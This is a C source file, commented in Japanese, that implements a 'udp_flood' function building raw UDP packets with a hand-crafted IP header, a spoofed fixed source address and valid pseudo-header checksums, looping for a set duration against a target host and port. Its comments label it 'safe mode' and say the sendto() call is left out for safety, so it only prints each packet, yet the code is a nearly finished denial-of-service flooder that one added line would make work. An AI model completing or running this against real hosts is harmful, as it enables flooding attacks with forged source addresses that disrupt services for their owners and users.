#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <time.h>

#include "udp_flood.h"

// チェックサム計算
static unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return (unsigned short)(~sum);
}

// 疑似ヘッダを使ったUDPチェックサム
static unsigned short udp_checksum(
    struct iphdr *iph,
    struct udphdr *udph,
    unsigned char *data,
    int data_len
) {
    struct pseudo_header {
        uint32_t src_addr;
        uint32_t dst_addr;
        uint8_t zero;
        uint8_t protocol;
        uint16_t udp_length;
    } ph;

    ph.src_addr = iph->saddr;
    ph.dst_addr = iph->daddr;
    ph.zero = 0;
    ph.protocol = IPPROTO_UDP;
    ph.udp_length = udph->len;

    int total_len = sizeof(ph) + sizeof(struct udphdr) + data_len;
    unsigned char *buf = malloc(total_len);

    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf + sizeof(ph), udph, sizeof(struct udphdr));
    memcpy(buf + sizeof(ph) + sizeof(struct udphdr), data, data_len);

    unsigned short cs = checksum((unsigned short *)buf, total_len);
    free(buf);
    return cs;
}

void udp_flood(const char *target, int port, int duration) {

    printf("[UDP Flood - SAFE MODE] %s:%d for %d sec\n",
        target, port, duration);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket()");
        return;
    }

    // Kernel に IP ヘッダを任せない（手動作成）
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    unsigned char buffer[4096];
    memset(buffer, 0, 4096);

    struct iphdr *iph = (struct iphdr *)buffer;
    struct udphdr *udph = (struct udphdr *)(buffer + sizeof(struct iphdr));
    char *data = (char *)(buffer + sizeof(struct iphdr) + sizeof(struct udphdr));

    strcpy(data, "SAFE_UDP_PAYLOAD");

    int data_len = strlen(data);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);

    // IPヘッダ設定
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = inet_addr("10.0.0.123"); // 学習用固定
    iph->daddr = addr.sin_addr.s_addr;

    // UDPヘッダ設定
    udph->source = htons(12345);
    udph->dest = htons(port);
    udph->len = htons(sizeof(struct udphdr) + data_len);
    udph->check = 0;

    // チェックサム（疑似ヘッダ使用）
    udph->check = udp_checksum(iph, udph, (unsigned char *)data, data_len);

    time_t start = time(NULL);

    while (time(NULL) - start < duration) {

        // 本番では sendto()
        // 今回は安全のため送信しない
        printf("Crafted UDP packet → %s:%d (checksum=%04x)\n",
            target, port, udph->check);

        usleep(50000); // CPU負荷軽減（学習用）
    }

    close(sock);
}
